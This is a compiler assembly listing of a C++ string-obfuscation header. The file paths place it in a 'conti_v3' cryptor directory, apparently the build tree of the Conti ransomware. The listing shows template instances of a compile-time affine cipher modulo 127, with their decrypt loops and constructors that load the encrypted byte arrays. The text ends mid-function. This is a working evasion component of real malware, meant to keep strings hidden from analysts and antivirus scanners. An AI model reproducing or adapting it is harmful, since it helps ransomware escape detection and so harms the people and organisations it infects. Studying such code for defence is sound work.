??0?$MetaBuffer@$0L@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<11,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<11,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 4f	 mov	 BYTE PTR [rcx+1], 79	; 0000004fH
  00007	c6 41 02 51	 mov	 BYTE PTR [rcx+2], 81	; 00000051H
  0000b	c6 41 03 3c	 mov	 BYTE PTR [rcx+3], 60	; 0000003cH
  0000f	c6 41 04 51	 mov	 BYTE PTR [rcx+4], 81	; 00000051H
  00013	c6 41 05 2b	 mov	 BYTE PTR [rcx+5], 43	; 0000002bH
  00017	c6 41 06 51	 mov	 BYTE PTR [rcx+6], 81	; 00000051H
  0001b	c6 41 07 1d	 mov	 BYTE PTR [rcx+7], 29
  0001f	c6 41 08 51	 mov	 BYTE PTR [rcx+8], 81	; 00000051H
  00023	c6 41 09 51	 mov	 BYTE PTR [rcx+9], 81	; 00000051H
  00027	c6 41 0a 51	 mov	 BYTE PTR [rcx+10], 81	; 00000051H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0L@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<11,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<11,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<107,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 1e	 sub	 ecx, 30

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 13	 imul	 r8d, ecx, 19

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<107,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<107,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<107,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 7e	 mov	 BYTE PTR [rcx+1], 126	; 0000007eH
  00007	c6 41 02 1e	 mov	 BYTE PTR [rcx+2], 30
  0000b	c6 41 03 16	 mov	 BYTE PTR [rcx+3], 22
  0000f	c6 41 04 1e	 mov	 BYTE PTR [rcx+4], 30
  00013	c6 41 05 4c	 mov	 BYTE PTR [rcx+5], 76	; 0000004cH
  00017	c6 41 06 1e	 mov	 BYTE PTR [rcx+6], 30
  0001b	c6 41 07 06	 mov	 BYTE PTR [rcx+7], 6
  0001f	c6 41 08 1e	 mov	 BYTE PTR [rcx+8], 30
  00023	c6 41 09 1e	 mov	 BYTE PTR [rcx+9], 30
  00027	c6 41 0a 1e	 mov	 BYTE PTR [rcx+10], 30
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0GL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<107,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<107,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0ED@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<67,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 5b 00 00 00	 mov	 eax, 91			; 0000005bH
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<67,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0ED@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0ED@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<67,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 7d	 mov	 BYTE PTR [rcx+1], 125	; 0000007dH
  00007	c6 41 02 5b	 mov	 BYTE PTR [rcx+2], 91	; 0000005bH
  0000b	c6 41 03 43	 mov	 BYTE PTR [rcx+3], 67	; 00000043H
  0000f	c6 41 04 5b	 mov	 BYTE PTR [rcx+4], 91	; 0000005bH
  00013	c6 41 05 66	 mov	 BYTE PTR [rcx+5], 102	; 00000066H
  00017	c6 41 06 5b	 mov	 BYTE PTR [rcx+6], 91	; 0000005bH
  0001b	c6 41 07 4f	 mov	 BYTE PTR [rcx+7], 79	; 0000004fH
  0001f	c6 41 08 5b	 mov	 BYTE PTR [rcx+8], 91	; 0000005bH
  00023	c6 41 09 5b	 mov	 BYTE PTR [rcx+9], 91	; 0000005bH
  00027	c6 41 0a 5b	 mov	 BYTE PTR [rcx+10], 91	; 0000005bH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0ED@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<67,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$02$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$02$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<3,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 60 00 00 00	 mov	 eax, 96			; 00000060H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2a	 imul	 ecx, eax, 42		; 0000002aH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$02$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<3,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$02$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$02$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<3,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<3,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 6b	 mov	 BYTE PTR [rcx+1], 107	; 0000006bH
  00007	c6 41 02 60	 mov	 BYTE PTR [rcx+2], 96	; 00000060H
  0000b	c6 41 03 15	 mov	 BYTE PTR [rcx+3], 21
  0000f	c6 41 04 60	 mov	 BYTE PTR [rcx+4], 96	; 00000060H
  00013	c6 41 05 30	 mov	 BYTE PTR [rcx+5], 48	; 00000030H
  00017	c6 41 06 60	 mov	 BYTE PTR [rcx+6], 96	; 00000060H
  0001b	c6 41 07 27	 mov	 BYTE PTR [rcx+7], 39	; 00000027H
  0001f	c6 41 08 60	 mov	 BYTE PTR [rcx+8], 96	; 00000060H
  00023	c6 41 09 60	 mov	 BYTE PTR [rcx+9], 96	; 00000060H
  00027	c6 41 0a 60	 mov	 BYTE PTR [rcx+10], 96	; 00000060H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$02$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<3,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<3,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<41,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0e 00 00
	00		 mov	 r11d, 14
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 03	 sub	 ecx, 3

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1f	 imul	 r8d, ecx, 31

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<41,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<41,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<41,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 6f	 mov	 BYTE PTR [rcx+1], 111	; 0000006fH
  00007	c6 41 02 03	 mov	 BYTE PTR [rcx+2], 3
  0000b	c6 41 03 79	 mov	 BYTE PTR [rcx+3], 121	; 00000079H
  0000f	c6 41 04 03	 mov	 BYTE PTR [rcx+4], 3
  00013	c6 41 05 1b	 mov	 BYTE PTR [rcx+5], 27
  00017	c6 41 06 03	 mov	 BYTE PTR [rcx+6], 3
  0001b	c6 41 07 17	 mov	 BYTE PTR [rcx+7], 23
  0001f	c6 41 08 03	 mov	 BYTE PTR [rcx+8], 3
  00023	c6 41 09 13	 mov	 BYTE PTR [rcx+9], 19
  00027	c6 41 0a 03	 mov	 BYTE PTR [rcx+10], 3
  0002b	c6 41 0b 71	 mov	 BYTE PTR [rcx+11], 113	; 00000071H
  0002f	c6 41 0c 03	 mov	 BYTE PTR [rcx+12], 3
  00033	c6 41 0d 03	 mov	 BYTE PTR [rcx+13], 3
  00037	c6 41 0e 03	 mov	 BYTE PTR [rcx+14], 3
  0003b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0003f	48 8b c1	 mov	 rax, rcx
  00042	c3		 ret	 0
??0?$MetaBuffer@$0CJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<41,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<41,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DF@$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<53,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

